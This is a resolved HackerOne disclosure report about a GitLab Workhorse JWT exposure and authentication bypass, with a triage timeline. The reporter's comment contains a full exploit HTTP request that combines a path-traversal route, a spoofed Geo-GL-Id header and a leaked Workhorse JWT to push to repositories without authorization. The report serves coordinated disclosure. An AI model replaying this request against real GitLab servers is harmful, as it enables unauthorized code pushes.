---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
date: 2022-07-05
submitted: 2020-11-22T20:43:25.855Z
bounty_usd: 10000
votes: 36
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ledz1996"
source: "https://hackerone.com/reports/1040786"
title: "Exposure of a valid Gitlab-Workhorse JWT leading to various bad things"
---
# Exposure of a valid Gitlab-Workhorse JWT leading to various bad things

> **Severity:** High | **Bounty:** 10,000 USD | **Votes:** 36 | **Program:** GitLab | **Disclosed:** 2022-07-05

- Report: [https://hackerone.com/reports/1040786](https://hackerone.com/reports/1040786)
- CWE: Improper Authentication - Generic
- Submitted: 2020-11-22T20:43:25.855Z

## Timeline

- **Report Filed**
- **2020-11-22** @gitlab-securitybot: Hi @ledz1996,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-11-23** @ledz1996: Oh, for internal-visibility project,
please add a valid `Authorization` Header in the last step

```http
POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1
Host: gitlab3.example.vm
Geo-GL-Id: key-1
User-Agent: git/2.28.0
Authorization: Basic <Base64 of any valid user:password>
Accept-Encoding: gzip, deflate
Gitlab-Workhorse-Api-Request: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cGxvYWQiOnsibWQ1IjoiYjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDkiLCJuYW1lIjoidGVzdC50eHQiLCJwYXRoIjoiL29wdC9naXRsYWIvZW1iZWRkZWQvc2VydmljZS9naXRsYWItcmFpbHMvcHVibGljL3VwbG9hZHMvdG1wL3Rlc3QudHh0NDAzMjM5MjUxIiwicmVtb3RlX2lkIjoiIiwicmVtb3RlX3VybCI6IiIsInNoYTEiOiI1ZmZlNTMzYjgzMGYwOGEwMzI2MzQ4YTkxNjBhZmFmYzhhZGE0NGRiIiwic2hhMjU2IjoiYjViZWE0MWI2YzYyM2Y3YzA5ZjFiZjI0ZGNhZTU4ZWJhYjNjMGNkZDkwYWQ5NjZiYzQzYTQ1YjQ0ODY3ZTEyYiIsInNoYTUxMiI6IjkxMjBjZDVmYWVmMDdhMDhlOTcxZmYwMjRhM2ZjYmVhMWUzYTZiNDQxNDJhNmQ4MmNhMjhjNmM0MmU0Zjg1MjU5NWJjZjUzZDgxZDc3NmYxMDU0MTA0NWFiZGI3YzM3OTUwNjI5NDE1ZDBkYzY2YzhkODZjNjRhNTYwNmQzMmRlIiwic2l6ZSI6IjQifSwiaXNzIjoiZ2l0bGFiLXdvcmtob3JzZSJ9.xvDjfRCxUK1bfLyM97sxiORbKmGLBr5Tte2c7ywSGz0
Content-Type: application/x-git-receive-pack-request
Accept: application/x-git-receive-pack-result
Content-Length: 436
Connection: close

00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACKxËA
B!Ð½§póõ;Dtö-gt¢ óc
uûºBÛotU[" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ£rJÞKòW"
"Ä
R!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}ý³¡¯a¾kå=ÕúsVOæme²6
Az^×ÿÜTx*Õÿ»Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í"¶Ü¿³ÐÌHt!4x+))á"gøÈÎ.LG^gßygßÿæ5,
```
- **2020-11-23** @ledz1996: Please let me know if you need any help in reproducing the vuln.Thanks
- **2020-11-25** @ledz1996: If you guys want I could PoC it on 1 of the public repositories in https://gitlab.com, I just need a Key ID of a user who can push or I could just brute force it.
- **2020-11-25** @ledz1996: Hi team, I just need a little update if there is any. Thanks you :(
- **2020-11-26** @ledz1996: This is partially due to the fact that 
- It is possible to pass data for gitaly to recognize as `git-receive-pack` as long as `workhorse` recognize the routes as `git-receive-pack`. This is achievable by appending `.%2f%2E%2Egit-receive-pack`, rails will recognize this as `param[:format]`  but due to Path cleaning by `workhorse`, this will be passed to gitaly as `git-receive-pack`
- However, the access check for rail would be for `git-upload-pack`. Initially there was no way to bypass the Access Check in `gitaly-hook`. But `Geo-Gl-ID` allow us to change the `user` in the data sent to Workhorse.
- **Report Severity Updated**
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2020-12-02** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2020-12-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-12-16** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2021-01-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **2021-03-02** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2021-03-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Agreed On Going Public**
- **2021-05-24** @ledz1996: Hi @dcouture, could you bear waiting for me a little bit before disclosing this, I'm writing a post about this, could be nice that this is disclosed within tbe day the blog post is finished, haha.
Thank you!
- **2021-05-25** @dcouture: No problem @ledz1996

Feel free to drop a link to the blog post when you accept the disclosure!
- **Agreed On Going Public**
- **Report Became Public**
